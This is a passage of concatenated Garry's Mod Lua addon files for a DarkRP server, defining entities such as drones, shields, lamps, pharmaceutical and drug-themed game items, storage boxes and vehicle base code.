			surface.DrawTexturedRect(self.ReticleTable.x, self.ReticleTable.y, self.ReticleTable.w, self.ReticleTable.h)

			-- Draw the SCOPE
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_closedsight"))
			surface.DrawTexturedRect(self.LensTable.x, self.LensTable.y, self.LensTable.w, self.LensTable.h)
			
			end
			
			if self.Secondary.UseMatador then
			
			-- Draw the SCOPE
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/rocketscope"))
			surface.DrawTexturedRect(self.LensTable.x-1, self.LensTable.y, self.LensTable.w, self.LensTable.h)

			end

	end
end

function SWEP:AdjustMouseSensitivity()
     
	if self.Owner:KeyDown(IN_ATTACK2) then
        return (1/(self.Secondary.ScopeZoom*0.5))
    	else 
    	return 1
     	end
end
--PATH addons/_farmer/lua/entities/ba_product/shared.lua:
ENT.Base = "base_gmodentity";
ENT.Type = "anim";

ENT.PrintName		= "Product";
ENT.Category 		= "Business: Animals";
ENT.Author			= "EnnX49";

ENT.Contact    		= "";
ENT.Purpose 		= "";
ENT.Instructions 	= "" ;

ENT.Spawnable			= true;
ENT.AdminSpawnable		= true;

--PATH gamemodes/darkrp/entities/entities/base_rp/cl_init.lua:
include('shared.lua')

function ENT:Draw()
	self:DrawModel()
	if self.Draw3D2D and self:InSight() then
		self:Draw3D2D()
	end
end
--PATH addons/_bitminers2/lua/entities/bm2_fuel/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Fuel"
ENT.Spawnable = true
ENT.Category = "Bitminers"
--PATH addons/_bitminers2/lua/entities/bm2_power_lead/cl_init.lua:
include( "shared.lua" )
function ENT:Initialize()
end

function ENT:Draw()
	self:DrawModel()
end
--PATH addons/_doctor/lua/entities/bp_chemical_keto_acid/shared.lua:
ENT.Type = "anim"
ENT.Base = "bp_base"

ENT.PrintName = "Keto Acid"
ENT.Spawnable = true
ENT.Category = "Blue's Pharmaceuticals"

ENT.RenderGroup = RENDERGROUP_BOTH

ENT.ChemicalID = 1


function ENT:SetupDataTables()
	self:NetworkVar("Int", 0, "LiquidAmount")
end
--PATH addons/_doctor/lua/entities/bp_chemical_prog/shared.lua:
ENT.Type = "anim"
ENT.Base = "bp_base"

ENT.PrintName = "Progestorone"
ENT.Spawnable = true
ENT.Category = "Blue's Pharmaceuticals"

ENT.RenderGroup = RENDERGROUP_BOTH

ENT.ChemicalID = 9


function ENT:SetupDataTables()
	self:NetworkVar("Int", 0, "LiquidAmount")
end
--PATH addons/_doctor/lua/entities/bp_freezer/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	self.csModel = ClientsideModel("models/blues_pharm/freezer_door.mdl", RENDERGROUP_VIEWMODEL_TRANSLUCENT)

	self.isOpen = false
	self.previousOpenState = false
	self.animationTime = 0
	self.soundCooldown = 0
end

--Sets the rotation of the stirrer
function ENT:SetDoorRotation()
	self:ManipulateBoneAngles(1, Angle(ang,0,0))
end

--Handle sounds

function ENT:Think()
	--When changing settings
	if not IsValid(self.csModel) then
		self.csModel = ClientsideModel("models/blues_pharm/freezer_door.mdl", RENDERGROUP_VIEWMODEL_TRANSLUCENT)
	end

	if not IsValid(self.csModel) then return end

	local ang = self:GetAngles()
	ang:RotateAroundAxis(ang:Right(), 90)

	if self.playerClose then 
		if self.animationTime < 1 then
			self.animationTime = math.Clamp(self.animationTime + (FrameTime() * 1), 0, 1)
		end
		ang:RotateAroundAxis(ang:Forward(), BLUES_PHARMA:Berp(self.animationTime, 0, 110))
		self.isOpen = true
	else
		if self.animationTime > 0 then
			self.animationTime = math.Clamp(self.animationTime - (FrameTime() * 2), 0, 1)
		end
		ang:RotateAroundAxis(ang:Forward(), BLUES_PHARMA:Sinerp(self.animationTime, 0, 110))
		self.isOpen = false
	end

	if not self:GetBonePosition(2) then return end
	self.csModel:SetPos(self:GetBonePosition(2))
	self.csModel:SetAngles(LerpAngle(30 * FrameTime(),self.csModel:GetAngles(), ang))

	if self.previousOpenState ~= self.isOpen then
		if self.isOpen then
			--Play open sounds
			if CurTime() > self.soundCooldown then
				self.soundCooldown = CurTime() + 0.3
				self:EmitSound("blues_pharm/freezer_open.wav", 75, math.random(90, 110), 0.5)
			end

			self.previousOpenState = self.isOpen
		else
			--Play close sound
			if self.animationTime < 0.1 then
				self:EmitSound("blues_pharm/freezer_close.wav", 75, math.random(99, 101), 0.5)
				self.previousOpenState = self.isOpen
			end
		end
	end
end

function ENT:Draw()
	self:DrawModel()
 
	local playerClose = false
	for k, v in player.Iterator() do
		if v:GetPos():DistToSqr(self:GetPos()) < 15000 then
			--Get the dot of the player, don't open if there behind
			local playerPos = (v:GetPos() - self:GetPos()):GetNormalized()
			local ourPos = self:GetAngles():Forward()
			local dot = playerPos:Dot(ourPos:GetNormalized())
			
			if dot > 0.7 then
				playerClose = true
				break
			end
		end
	end
	self.playerClose = playerClose
end  

--Free up the pooled material and remove from render list
function ENT:OnRemove()
	if IsValid(self.csModel) then
		self.csModel:Remove()
	end
end
--PATH addons/_doctor/lua/entities/bp_pill_market/cl_init.lua:
include("shared.lua")
ENT.RenderGroup = RENDERGROUP_BOTH

local titleIcon = Material("blues_pharm/ui/title.png", "smooth")

function ENT:Draw()
	self:DrawModel()

	if self:GetPos():DistToSqr(LocalPlayer():GetPos()) > BLUES_PHARMA.CONFIG.Cam3D2DRenderDist  then return end

	local ang = self:GetAngles()
	local pos = self:GetPos() + (ang:Up() * 53)

	local ang1 = self:WorldToLocalAngles((LocalPlayer():EyePos() - pos):Angle())
	local ang2 = self:LocalToWorldAngles(Angle(0, ang1.y + 90, 90))

	cam.Start3D2D(pos, ang2, 0.1)
		surface.SetMaterial(titleIcon)
		surface.SetDrawColor(Color(255, 255, 255, 255))
		surface.DrawTexturedRect(-160, -270, 280, 65)

		draw.RoundedBox(0, -160, -270, 20, 820, Color(43, 43, 43))

		draw.SimpleText("Pill Market", "BP_Chemical_Title",  -135, -270, Color(255, 255, 255), 0, 0)
		draw.SimpleText("Sell pills here", "BP_Chemical_Amount",  - 135, -240, Color(255, 255, 255, 60), 0, 0)
	cam.End3D2D()
end

function ENT:SetRagdollBones( b )
	self.m_bRagdollSetup = b
end

function ENT:DrawTranslucent()
	self:Draw()
end



--PATH addons/_ballistic_shields/lua/entities/bs_dshield/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Deployable shield"
ENT.Category = "Ballistic shields"
ENT.Spawnable = false
ENT.DisableDuplicator = true
--PATH addons/_ballistic_shields/lua/entities/bs_rshield/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Riot shield"
ENT.Category = "Ballistic shields"
ENT.Spawnable = false
ENT.DisableDuplicator = true
--PATH addons/_ballistic_shields/lua/entities/bs_shield/cl_init.lua:
include( "shared.lua" )
include( "ballistic_shields/cl_bs_util.lua" )
ENT.RenderGroup = RENDERGROUP_BOTH
function ENT:Draw()
	if bshields.config.dShieldTexture == "" then
		self:DrawModel()
		return
	end

	local webmat = surface.GetURL( bshields.config.dShieldTexture, 256, 256 )
	if self.Mat then render.MaterialOverrideByIndex( 6, self.Mat ) end
	local html_mat = webmat
	local matdata = {
		["$basetexture"] = html_mat:GetName(),
		["$decal"] = 1,
		["$translucent"] = 1
	}

	local uid = string.Replace( html_mat:GetName(), "__vgui_texture_", "" )
	self.Mat = CreateMaterial( "bshields_webmat_" .. uid, "VertexLitGeneric", matdata )
	self:DrawModel()
	render.ModelMaterialOverride( nil )
end
--PATH addons/_ballistic_shields/lua/ballistic_shields/cl_bs_util.lua:
if SERVER then return end
include( "bs_config.lua" )
net.Receive( "bs_shield_info", function() LocalPlayer().bs_shieldIndex = net.ReadUInt( 16 ) end )
local Delay = 0
function bshields_materials_reload()
	for _, v in pairs( bshields.materialstoload ) do
		Delay = Delay + 0.2
		timer.Simple( Delay, function() surface.GetURL( v[1], v[2], v[3] ) end )
	end

	bshields.hshield_webmat = surface.GetURL( bshields.config.hShieldTexture, 256, 256 )
	bshields.rshield_webmat = surface.GetURL( bshields.config.rShieldTexture, 256, 256 )
	bshields.dshield_webmat = surface.GetURL( bshields.config.dShieldTexture, 256, 256 )
end

bshields.materialstoload = { { bshields.config.hShieldTexture, 256, 256 }, { bshields.config.rShieldTexture, 256, 256 }, { bshields.config.dShieldTexture, 256, 256 } }
hook.Add( "InitPostEntity", "bshields_init_client", function() bshields_materials_reload() end )
--PATH addons/__main/lua/entities/connection_gun/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.PrintName		= "Spiderman's Swep"
ENT.Author			= "DORPZ BEETCH"
ENT.Information			= "Uses 9mm ammo"
ENT.Category		= "Superhero"

ENT.Spawnable		= true
ENT.AdminSpawnable	= true
--PATH addons/_drones/lua/entities/dronesrewrite_plotdr/cl_init.lua:
include("shared.lua")


--PATH addons/_drones/lua/entities/dronesrewrite_racerdr/cl_init.lua:
include("shared.lua")

function ENT:Draw()
	self.BaseClass.Draw(self)

	if self:IsDroneWorkable() then
		local color = self:GetColor()

		for i = -1, 1, 2 do
			local dlight = DynamicLight(self:EntIndex())
			local pos = self:LocalToWorld(Vector(3.7, -4.5 * i, 0.4))

			if dlight then
				dlight.pos = pos
				dlight.r = color.r
				dlight.g = color.g
				dlight.b = color.b
				dlight.brightness = 1
				dlight.Decay = 1000
				dlight.Size = 50
				dlight.DieTime = CurTime() + 0.1
			end

			render.SetMaterial(Material("particle/particle_glow_04_additive"))
			render.DrawSprite(pos, 8, 6, color)
		end
	end
end
--PATH addons/_drones/lua/entities/dronesrewrite_rgundr/cl_init.lua:
include("shared.lua")

function ENT:Draw()
	self.BaseClass.Draw(self)

	if self:IsDroneWorkable() then
		local dlight = DynamicLight(self:EntIndex())
		local pos = self:LocalToWorld(self.FirstPersonCam_pos)
		if dlight then
			dlight.pos = pos
			dlight.r = 255
			dlight.g = 100
			dlight.b = 0
			dlight.brightness = 1
			dlight.Decay = 1000
			dlight.Size = 80
			dlight.DieTime = CurTime() + 0.1
		end

		render.SetMaterial(Material("particle/particle_glow_04_additive"))
		render.DrawSprite(pos, 12, 12, Color(255, 100, 0, 30))
	end
end
--PATH addons/_drones/lua/entities/dronesrewrite_spy/shared.lua:
ENT.Base = "dronesrewrite_base"
ENT.Type = "anim"
ENT.PrintName = "Spy Drone"
ENT.Spawnable = true
ENT.AdminSpawnable = true
ENT.Category = "Drones Rewrite"

ENT.UNIT = "SPY"

ENT.HUD_hudName = "White Box"

ENT.Model = "models/dronesrewrite/spydr/spydr.mdl"

ENT.Weight = 90

ENT.Speed = 650
ENT.UpSpeed = 3300
ENT.RotateSpeed = 5
ENT.AngOffset = 4
ENT.NoiseCoefficient = 0.8
ENT.Alignment = 3

ENT.Damping = 1
ENT.AngDamping = 0
ENT.AngPitchDamping = 1
ENT.AngYawDamping = 0.4
ENT.AngRollDamping = 1

ENT.HackValue = 3

ENT.FirstPersonCam_pos = Vector(20.5, 0, 0)
ENT.ThirdPersonCam_distance = 50
ENT.RenderCam = false

ENT.AllowYawRestrictions = true
ENT.YawMin = -80
ENT.YawMax = 80

ENT.KeysFuncs = DRONES_REWRITE.DefaultKeys()

ENT.AllowPitchRestrictions = false

ENT.HealthAmount = 50
ENT.DefaultHealth = 50

ENT.Fuel = 50
ENT.MaxFuel = 50
ENT.FuelReduction = 0.1

ENT.Sounds = {
	PropellerSound = {
		Name = "npc/manhack/mh_engine_loop1.wav",
		Pitch = 200,
		Volume = 0.2,
		Level = 65
	},

	ExplosionSound = {
		Name = "ambient/explosions/explode_1.wav",
		Level = 69
	}
}

ENT.Propellers = {
	Damage = 1,
	Scale = 1.3,
	Health = 30,
	HitRange = 14,
	Model = "models/dronesrewrite/propellers/propeller1_2.mdl",

	Info = {
		Vector(0, 0, 1)
	}
}

ENT.Weapons = {
	["User & Invisible"] = { 
		Name = "User", 
		Sync = { ["1"] = { fire1 = "fire2" } } 
	},

	["1"] = { 
		Name = "Invisible",
		Select = false
	}
}

ENT.Modules = DRONES_REWRITE.GetBaseModules()
--PATH addons/_drones/lua/entities/dronesrewrite_spydrone/cl_init.lua:
include("shared.lua")

--PATH addons/_drones/lua/entities/dronesrewrite_warriordr/cl_init.lua:
include("shared.lua")

function ENT:Draw()
	self.BaseClass.Draw(self)

	if self:IsDroneWorkable() then
		local dlight = DynamicLight(self:EntIndex())
		if dlight then
			dlight.pos = self:LocalToWorld(self.FirstPersonCam_pos)
			dlight.r = 255
			dlight.g = 0
			dlight.b = 0
			dlight.brightness = 1
			dlight.Decay = 1000
			dlight.Size = 80
			dlight.DieTime = CurTime() + 0.1
		end
	end
end
--PATH addons/__main/lua/entities/durgz_base/shared.lua:
DURGZ_HUD_FONT = "Trebuchet24"




ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Drugz"
ENT.Nicknames = {"Drugz"}
ENT.OverdosePhrase = {"took"}
ENT.Author = "God"
ENT.Category = "Drugs"
ENT.Spawnable = false
ENT.AdminSpawnable = false
ENT.Information	 = "" 



ENT.TRANSITION_TIME = 0

if(CLIENT)then
	DURGZ_LOST_VIRGINITY = false;
	
	usermessage.Hook("durgz_lose_virginity", function(um)
		DURGZ_LOST_VIRGINITY = true;
	end)
	function ENT:Initialize()
	end


	function ENT:Draw()
		self:DrawModel()
	end

end

--PATH addons/_eml/lua/entities/eml_buyer/shared.lua:
ENT.Base = "base_ai"
ENT.Type = "ai"

ENT.PrintName = "НПС Наркоман"
ENT.Author = "EnnX49"
ENT.Contact = ""
ENT.Category	= "EML"

ENT.AutomaticFrameAdvance = true
   
ENT.Spawnable = true
ENT.AdminSpawnable = true

function ENT:PhysicsCollide( data, physobj )
end

function ENT:PhysicsUpdate( physobj )
end

function ENT:SetAutomaticFrameAdvance( bUsingAnim )
	self.AutomaticFrameAdvance = bUsingAnim
end 
--PATH addons/_eml/lua/entities/eml_meth/shared.lua:
ENT.Base = "base_anim";
ENT.Type = "anim";

ENT.PrintName		= "Кристалічний Мет";
ENT.Category 		= "EML";
ENT.Author			= "EnnX49";

ENT.Contact    		= "";
ENT.Purpose 		= "";
ENT.Instructions 	= "" ;

ENT.Spawnable			= true;
ENT.AdminSpawnable		= true;

--PATH addons/__main/lua/entities/ent_undertale_bone_throw.lua:
AddCSLuaFile()

ENT.Type = "anim"
ENT.Base = "base_anim"

ENT.Editable		= true
ENT.PrintName		= "Undertale Bone"
ENT.Spawnable 		= false
ENT.AdminSpawnable 	= false

function ENT:Initialize()
	if( SERVER ) then
		self:SetModel( "models/undertale/undertale_bone.mdl" )
		self:SetTrigger( true )
		self:PhysicsInit( SOLID_VPHYSICS )
		self:SetMoveType( MOVETYPE_VPHYSICS )
		self:SetSolid( SOLID_VPHYSICS )
		self:SetModelScale( self:GetModelScale() * 0.5, 0 )
		self:SetVar( "hit", false )
		
		local phys = self:GetPhysicsObject()
		phys:EnableGravity( false )

		timer.Simple(5,function() self:Remove() end)
	end
	
	if( CLIENT ) then
		local vec = self:GetPos()
		local emitter = ParticleEmitter( vec, false )
		
		//effects/fire_cloud1
		for cycles = 1, 10 do
			local particle = emitter:Add( Material( "effects/fire_cloud1" ), vec )
			if( particle ) then
				particle:SetVelocity( VectorRand() * 40 )
				particle:SetColor( 0, 100, 255 ) 
				particle:SetLifeTime( 0 )
				particle:SetDieTime( 1 )
				particle:SetAngles( Angle( math.Rand( 0, 360 ), 0, 0 ) )
				particle:SetAngleVelocity( Angle( math.Rand( -1, 1 ), 0, 0 ) )
				particle:SetStartSize( 20 )
				particle:SetEndSize( 10 )
				particle:SetStartAlpha( 255 )
				particle:SetEndAlpha( 0 )
				particle:SetGravity( Vector( 0, 0, 60 ) )
			end
		end
		
		emitter:Finish()
	end
end

if( SERVER ) then
	function ENT:Think()
		local parent = self:GetParent()
		
		if( parent:IsValid() ) then
			if( parent:IsPlayer() ) then
				if( parent:Health() <= 0 ) then
					self:Remove()
				end
			end
		end
	end

	function ENT:PhysicsUpdate( )
		if( !self:GetVar( "hit", NULL ) ) then
			if( self:GetVelocity():Length() < 1000 ) then
				self:SetVar( "hit", true )
				self:Fire( "Kill", "", 10 )
				local phys = self:GetPhysicsObject()
				phys:EnableGravity( true )
			end
		end
	end

	function ENT:PhysicsCollide( data, phys )
		if( !self:GetVar( "hit", NULL ) ) then
			if( data.Speed > 100 ) then
				local hitEnt = data.HitEntity
				
				if( hitEnt:GetClass() != "ent_undertale_bone_throw" && hitEnt != self.Owner ) then
					self:SetMoveType( MOVETYPE_NONE )
					self:SetPos( data.HitPos )
					self:SetSolid( SOLID_NONE )
					
					if( hitEnt:IsValid()) then
						//if hitEnt:Health() > 0 then
							hitEnt:TakeDamage( 15, self.Owner, self )
							self:SetParent( hitEnt, -1 )
						//end
					end
					
					self:SetVar( "hit", true )
					self:Fire( "Kill", "", 10 )
					sound.Play( Sound( "undertale/sans/smash.wav" ), self:GetPos() )
				end
			end
		end
	end
end
--PATH gamemodes/darkrp/entities/entities/gmod_lamp.lua:
AddCSLuaFile()
local BaseClass = baseclass.Get("base_anim")

ENT.Spawnable			= false
ENT.RenderGroup 		= RENDERGROUP_BOTH

local matLight 			= Material("sprites/light_ignorez")
local matBeam			= Material("effects/lamp_beam")

AccessorFunc(ENT, "Texture", "FlashlightTexture")

function ENT:SetupDataTables()
	self:NetworkVar("Bool", 0, "On")
	self:NetworkVar("Bool", 1, "Toggle")
	self:NetworkVar("Float", 0, "LightFOV")
	self:NetworkVar("Float", 1, "Distance")
	self:NetworkVar("Float", 2, "Brightness")
end

function ENT:GetEntityDriveMode()
	return "drive_noclip"
end
-- 612 
function ENT:Initialize()
	if (SERVER) then
		self:PhysicsInit(SOLID_VPHYSICS)
		self:SetMoveType(MOVETYPE_VPHYSICS)
		self:SetSolid(SOLID_VPHYSICS)
		self:SetCollisionGroup(COLLISION_GROUP_WORLD)
		self:DrawShadow(false)

		self:PhysWake()
	end

	if (CLIENT) then
		self.PixVis = util.GetPixelVisibleHandle()
	end
end

function ENT:OnTakeDamage(dmginfo)
	self:TakePhysicsDamage(dmginfo)
end

function ENT:Switch(bOn)
	if (bOn == self:GetOn()) then return end

	self.on = bOn;

	if (!bOn) then

		SafeRemoveEntity(self.flashlight)
		self.flashlight = nil
		self:SetOn(false)
		return

	end

	self:SetOn(true)

	local angForward = self:GetAngles()

	self.flashlight = ents.Create("env_projectedtexture")

		self.flashlight:SetParent(self.Entity)

		-- The local positions are the offsets from parent..
		self.flashlight:SetLocalPos(Vector(0, 0, 0))
		self.flashlight:SetLocalAngles(Angle(0,0,0))

		-- Looks like only one flashlight can have shadows enabled!
		self.flashlight:SetKeyValue("enableshadows", 1)
		self.flashlight:SetKeyValue("farz", self:GetDistance())
		self.flashlight:SetKeyValue("nearz", 12)
		self.flashlight:SetKeyValue("lightfov", self:GetLightFOV())

		local c = self:GetColor()
		local b = self:GetBrightness()
		self.flashlight:SetKeyValue("lightcolor", Format("%i %i %i 255", c.r * b, c.g * b, c.b * b))

	self.flashlight:Spawn()

	self.flashlight:Input("SpotlightTexture", NULL, NULL, self:GetFlashlightTexture())
end

function ENT:Toggle()
	self:Switch(!self:GetOn())
end

function ENT:UpdateLight()

	if (!IsValid(self.flashlight)) then return end

	self.flashlight:Input("SpotlightTexture", NULL, NULL, self:GetFlashlightTexture())
	self.flashlight:Input("FOV", NULL, NULL, tostring(self:GetLightFOV()))
	self.flashlight:SetKeyValue("farz", self:GetDistance())

	local c = self:GetColor()
	local b = self:GetBrightness()
	self.flashlight:SetKeyValue("lightcolor", Format("%i %i %i 255", c.r*b, c.g*b, c.b*b))

end

function ENT:DrawTranslucent()
	if (!self:GetOn()) then return end

	local LightNrm = self:GetAngles():Forward()
	local ViewNormal = self:GetPos() - EyePos()
	local Distance = ViewNormal:Length()
	ViewNormal:Normalize()
	local ViewDot = ViewNormal:Dot(LightNrm * -1)
	local LightPos = self:GetPos() + LightNrm * 5

	if (ViewDot >= 0) then

		render.SetMaterial(matLight)
		local Visibile	= util.PixelVisible(LightPos, 16, self.PixVis)

		if (!Visibile) then return end

		local Size = math.Clamp(Distance * Visibile * ViewDot * 2, 64, 512)

		Distance = math.Clamp(Distance, 32, 800)
		local Alpha = math.Clamp((1000 - Distance) * Visibile * ViewDot, 0, 100)
		local Col = self:GetColor()
		Col.a = Alpha

		render.DrawSprite(LightPos, Size, Size, Col, Visibile * ViewDot)
		render.DrawSprite(LightPos, Size*0.4, Size*0.4, Color(255, 255, 255, Alpha), Visibile * ViewDot)

	end
end
--PATH gamemodes/darkrp/entities/entities/gmod_light.lua:
AddCSLuaFile()
local BaseClass = baseclass.Get("base_anim")

ENT.Spawnable			= false
ENT.RenderGroup 		= RENDERGROUP_BOTH

local matLight 		= Material("sprites/light_ignorez")
local MODEL			= Model("models/MaxOfS2D/light_tubular.mdl")

function ENT:SetupDataTables()
	self:NetworkVar("Bool", 0, "On")
	self:NetworkVar("Bool", 1, "Toggle")
	self:NetworkVar("Float", 1, "LightSize")
	self:NetworkVar("Float", 2, "Brightness")
end
-- 512 
function ENT:Initialize()
	if (CLIENT) then
		self.PixVis = util.GetPixelVisibleHandle()
	end

	if (SERVER) then
		self:SetModel(MODEL)
		self:PhysicsInit(SOLID_VPHYSICS)
		self:SetMoveType(MOVETYPE_VPHYSICS)
		self:SetSolid(SOLID_VPHYSICS)
		self:SetCollisionGroup(COLLISION_GROUP_WORLD)
		self:DrawShadow(false)

		self:PhysWake()
	end
end

function ENT:Think()
	if (CLIENT) then
		if (not self:GetOn()) or (not self:InView()) then return end

		local dlight = DynamicLight(self:EntIndex())

		if (dlight) then
			local c = self:GetColor()

			dlight.Pos = self:GetPos()
			dlight.r = c.r
			dlight.g = c.g
			dlight.b = c.b
			dlight.Brightness = self:GetBrightness()
			dlight.Decay = self:GetLightSize() * 5
			dlight.Size = self:GetLightSize()
			dlight.DieTime = CurTime() + 2
		end
	end
end

function ENT:Toggle()
	self:SetOn(not self:GetOn())
end
--PATH addons/_drones/lua/entities/item_drr_cannon.lua:
AddCSLuaFile()

ENT.Base = "item_drr_ammobase"
ENT.Type = "anim"
ENT.PrintName = "Artillery Projectiles"
ENT.Category = "Drones Rewrite Ammo"
ENT.Spawnable = true
ENT.AdminSpaawnable = true

ENT.Amount = 8
ENT.Model = "models/dronesrewrite/ammobox/ammobox.mdl"
ENT.Material = "models/dronesrewrite/ammunition/ammo_exp"

--PATH addons/_drones/lua/entities/item_drr_gmissiles.lua:
AddCSLuaFile()

ENT.Base = "item_drr_ammobase"
ENT.Type = "anim"
ENT.PrintName = "Guided Missiles"
ENT.Category = "Drones Rewrite Ammo"
ENT.Spawnable = true
ENT.AdminSpaawnable = true

ENT.Amount = 2
ENT.Model = "models/dronesrewrite/ammobox/ammobox.mdl"
ENT.Material = "models/dronesrewrite/ammunition/ammo_rock"

--PATH addons/____inventory/lua/entities/itemstore_box.lua:
ENT.Type = "anim"

ENT.PrintName = "Small Box"
ENT.Category = "ItemStore"

ENT.Spawnable = true
ENT.AdminOnly = true

function ENT:SetupDataTables()
	self:NetworkVar( "Entity", 0, "owning_ent" ) -- i feel really stupid.
end

if SERVER then
	AddCSLuaFile()

	ENT.Model = "models/props/cs_office/Cardboard_box02.mdl"

	ENT.ContainerWidth = 4
	ENT.ContainerHeight = 3
	ENT.ContainerPages = 1

	ENT.Broken = false

	function ENT:Initialize()
		self:SetModel( self.Model )

		self:PhysicsInit( SOLID_VPHYSICS )
		self:SetMoveType( MOVETYPE_VPHYSICS )
		self:SetSolid( SOLID_VPHYSICS )
		self:SetUseType( SIMPLE_USE )

		self:GetPhysicsObject():Wake()

		self.Container = itemstore.Container( self.ContainerWidth, self.ContainerHeight, self.ContainerPages )
		self.Container:SetOwner( self )

		if self.Items then
			for _, item in ipairs( self.Items ) do
				self.Container:AddItem( item:Copy() )
			end
		end

		local function callback( con, pl )
			if not IsValid( pl ) then return end
			
			if pl:GetPos():Distance( self:GetPos() ) < 250 then
				return true
			end

			return false
		end

		self.Container:AddCallback( "read", callback )
		self.Container:AddCallback( "write", callback )

		self:SetHealth( itemstore.config.BoxHealth )
	end

	function ENT:SpawnFunction( pl, trace, class )
		local ent = ents.Create( class )
		ent:SetPos( trace.HitPos + trace.HitNormal * 16 )
		ent:Spawn()

		return ent
	end

	function ENT:Use( pl )
		self.Container:Sync()
		pl:OpenContainer( self.Container:GetID(), "Box" )
	end

	function ENT:Break()
		if self.Broken then return end -- if something hits this multiple times on the same frame i guess it can break multiple times? weird

		local effect = EffectData()
		effect:SetOrigin( self:GetPos() )
		util.Effect( "Explosion", effect, true, true )

		for _, item in pairs( self.Container.Items ) do
			item:CreateEntity( self:GetPos() )
		end

		self.Broken = true
		self:Remove()
	end

	function ENT:OnTakeDamage( dmg )
		if not itemstore.config.BoxBreakable then return end

		self:SetHealth( self:Health() - dmg:GetDamage() )

		if self:Health() <= 0 then
			self:Break()
		end
	end

	function ENT:OnRemove()
		self.Container:Remove()
	end
end

--PATH addons/lvs_base-main/lua/entities/lvs_base/cl_init.lua:
include("shared.lua")
include( "sh_weapons.lua" )
include( "cl_effects.lua" )
include( "cl_hud.lua" )
include( "cl_seatswitcher.lua" )
include( "cl_trailsystem.lua" )
include( "cl_boneposeparemeter.lua" )

local Zoom = 0

function ENT:LVSCalcFov( fov, ply )

	local TargetZoom = ply:lvsKeyDown( "ZOOM" ) and 0 or 1

	Zoom = Zoom + (TargetZoom - Zoom) * RealFrameTime() * 10

	local newfov = fov * Zoom + (self.ZoomFov or 40) * (1 - Zoom)

	return newfov
end

function ENT:LVSCalcView( ply, pos, angles, fov, pod )
	return LVS:CalcView( self, ply, pos, angles, fov, pod )
end

function ENT:PreDraw( flags )
	return true
end

function ENT:PreDrawTranslucent( flags )
	return true
end

function ENT:PostDraw( flags )
end

function ENT:PostDrawTranslucent( flags )
end

function ENT:Draw( flags )
	if self:PreDraw( flags ) then
		if self.lvsLegacyDraw then
			self:DrawModel() -- ugly, but required in order to fix old addons. Refract wont work on these.
		else
			self:DrawModel( flags )
		end
	end

	self:PostDraw( flags )
end

function ENT:DrawTranslucent( flags )
	self:DrawTrail()

	if self:PreDrawTranslucent( flags ) then
		self:DrawModel( flags )
	else
		self.lvsLegacyDraw = true -- insert puke simley
	end

	self:PostDrawTranslucent( flags )
end

function ENT:Initialize()
	self:OnSpawn()

	if not istable( self.GibModels ) then return end

	for _, modelName in ipairs( self.GibModels ) do
		util.PrecacheModel( modelName )
	end
end

function ENT:OnSpawn()
end

function ENT:OnFrameActive()
end

function ENT:OnFrame()
end

function ENT:OnEngineActiveChanged( Active )
end

function ENT:OnActiveChanged( Active )
end

ENT._oldActive = false
ENT._oldEnActive = false

function ENT:HandleActive()
	local EntTable = self:GetTable()

	local Active = self:GetActive()
	local EngineActive = self:GetEngineActive()
	local ActiveChanged = false

	if EntTable._oldActive ~= Active then
		EntTable._oldActive = Active
		EntTable:OnActiveChanged( Active )
		ActiveChanged = true
	end

	if EntTable._oldEnActive ~= EngineActive then
		EntTable._oldEnActive = EngineActive
		self:OnEngineActiveChanged( EngineActive )
		ActiveChanged = true
	end

	if ActiveChanged then
		if Active or EngineActive then
			self:StartWindSounds()
		else
			self:StopWindSounds()
		end
	end

	if Active or EngineActive then
		self:DoVehicleFX()
	end

	self:FlyByThink()

	return EngineActive
end

function ENT:Think()
	if not self:IsInitialized() then return end
 
	if self:HandleActive() then
		self:OnFrameActive()
	end

	self:HandleTrail()
	self:OnFrame()
end

function ENT:OnRemove()
	self:StopEmitter()
	self:StopWindSounds()
	self:StopFlyBy()
	self:StopDeathSound()

	self:OnRemoved()
end

function ENT:OnRemoved()
end

function ENT:CalcDoppler( Ent )
	if not IsValid( Ent ) then return 1 end

	if Ent:IsPlayer() then
		local ViewEnt = Ent:GetViewEntity()
		local Vehicle = Ent:lvsGetVehicle()

		if IsValid( Vehicle ) then
			if Ent == ViewEnt then
				Ent = Vehicle
			end
		else
			if IsValid( ViewEnt ) then
				Ent = ViewEnt
			end
		end
	end

	local sVel = self:GetVelocity()
	local oVel = Ent:GetVelocity()

	local SubVel = oVel - sVel
	local SubPos = self:GetPos() - Ent:GetPos()

	local DirPos = SubPos:GetNormalized()
	local DirVel = SubVel:GetNormalized()

	local A = math.acos( math.Clamp( DirVel:Dot( DirPos ) ,-1,1) )

	return (1 + math.cos( A ) * SubVel:Length() / 13503.9)
end

function ENT:GetCrosshairFilterEnts()
	if not self:IsInitialized() then return { self } end -- wait for the server to be ready

	if not istable( self.CrosshairFilterEnts ) then
		self.CrosshairFilterEnts = {self}

		-- lets ask the server to build the filter for us because it has access to constraint.GetAllConstrainedEntities() 
		net.Start( "lvs_player_request_filter" )
			net.WriteEntity( self )
		net.SendToServer()
	end

	return self.CrosshairFilterEnts
end

function ENT:FlyByThink()
end

function ENT:StopFlyBy()
end

function ENT:StopDeathSound()
end

function ENT:OnDestroyed()
end

net.Receive( "lvs_vehicle_destroy", function( len )
	local ent = net.ReadEntity()

	if not IsValid( ent ) or not isfunction( ent.OnDestroyed ) then return end

	ent:OnDestroyed()
end )

--PATH addons/lvs_cars_3027255911/lua/entities/lvs_base_wheeldrive/cl_init.lua:
include("shared.lua")
include("sh_animations.lua")
include("sh_camera_eyetrace.lua")
include("cl_flyby.lua")
include("cl_tiresounds.lua")
include("cl_camera.lua")
include("cl_hud.lua")
include("cl_scrolltexture.lua")
include("cl_exhausteffects.lua")

DEFINE_BASECLASS( "lvs_base" )

function ENT:CreateSubMaterial( SubMaterialID, name )
	if not SubMaterialID then return end

	local mat = self:GetMaterials()[ SubMaterialID + 1 ]

	if not mat then return end

	local string_data = file.Read( "materials/"..mat..".vmt", "GAME" )

	if not string_data then return end

